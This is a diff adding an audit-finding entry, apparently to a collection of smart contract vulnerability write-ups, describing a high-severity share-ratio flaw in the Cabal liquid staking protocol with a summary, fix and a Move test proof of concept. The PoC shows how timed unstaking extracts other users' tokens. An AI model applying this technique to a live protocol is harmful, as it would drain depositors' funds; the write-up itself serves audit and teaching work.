@@ -1483,3 +1483,73 @@ contract ForteTest is Test {
 ```
 
 </details>
+
+## 24.[High] LP unstaking only burns the shares but leaves the underlying tokens in the system, which distorts the shares-to-tokens ratio and leads to incorrect amounts being calculated during staking and unstaking
+
+### Distorts the shares-to-tokens ratio
+
+- Summary: In the Cabal protocol, when users unstake LP tokens, their Cabal token shares are burned immediately, but the actual undelegation of the underlying tokens (ULP) from the validator occurs after a delay. During this delay, the tokens pending undelegation are still counted in the system's total staked amount, which inflates the shares-to-tokens ratio. As a result, users who unstake during this period receive more tokens than they should, effectively taking tokens that belong to others. Conversely, users who stake during this period receive fewer shares than they deserve. This leads to systemic misallocation of funds and unfair outcomes.
+
+- Impact & Recommendation: The recommended fix is to exclude the pending undelegation amounts when calculating token value per share.
+  <br> 🐬: [Source](https://code4rena.com/reports/2025-04-cabal-liquid-staking-token#h-01-lp-unstaking-only-burns-the-shares-but-leaves-the-underlying-tokens-in-the-system-which-distorts-the-shares-to-tokens-ratio-and-leads-to-incorrect-amounts-being-calculated-during-staking-and-unstaking) & [Report](https://code4rena.com/reports/2025-04-cabal-liquid-staking-token)
+
+<details><summary>POC</summary>
+
+```solidity
+
+    #[test(
+        c = @staking_addr, user_a = @0xAAA, user_b = @0xBBB, user_c = @0xCCC
+    )]
+    fun test_poc(
+        c: &signer,
+        user_a: &signer,
+        user_b: &signer,
+        user_c: &signer
+    ) {
+        test_setup(c, string::utf8(b"initvaloper1test"));
+
+        //gets the metadata for all tokens
+        let ulp_metadata = coin::metadata(@initia_std, string::utf8(b"ulp"));
+        let init_metadata = coin::metadata(@initia_std, string::utf8(b"uinit"));
+        let cabal_lp_metadata = cabal::get_cabal_token_metadata(1);
+        let x_init_metadata = cabal::get_xinit_metadata();
+        let sx_init_metadata = cabal::get_sxinit_metadata();
+
+        let initia_signer = &account::create_signer_for_test(@initia_std);
+
+        let ulp_decimals = 1_000_000; //ulp has 6 decimals
+
+        let deposit_amount_a = 100 * ulp_decimals; //the amount user a deposits
+        primary_fungible_store::transfer( //user a must first be funded
+            initia_signer,
+            ulp_metadata,
+            signer::address_of(user_a),
+            deposit_amount_a
+        );
+        utils::increase_block(1, 1);
+        cabal::mock_stake(user_a, 1, deposit_amount_a); //user a stakes 100 ulp
+
+        utils::increase_block(1, 1);
+
+        let deposit_amount_b = 50 * ulp_decimals; //the amount user b stakes
+        primary_fungible_store::transfer(
+            initia_signer,
+            ulp_metadata,
+            signer::address_of(user_b),
+            deposit_amount_b
+        );
+        utils::increase_block(1, 1);
+        cabal::mock_stake(user_b, 1, deposit_amount_b); //user b stakes 50 ulp
+
+        utils::increase_block(1, 1000);
+        cabal::mock_unstake(user_b, 1, deposit_amount_b); //user b unstakes 50 ulp this means the cabal tokens are now 100 and the underlying tokens 150
+        //This mock unstaking uses the pool balances instead of querying the validator because Cosmos is not supported during testing.
+        //However, this is not a problem, since the pools are only modified after the undelegation, not during the unstaking
+
+        utils::increase_block(1, 1000);
+        cabal::mock_unstake(user_a, 1, 50 * ulp_decimals); //user a unstakes half of his cabal lp tokens for which 50 ulp tokens should be unstaked but actually 75 are getting unstaked
+    }
+
+```
+
+</details>
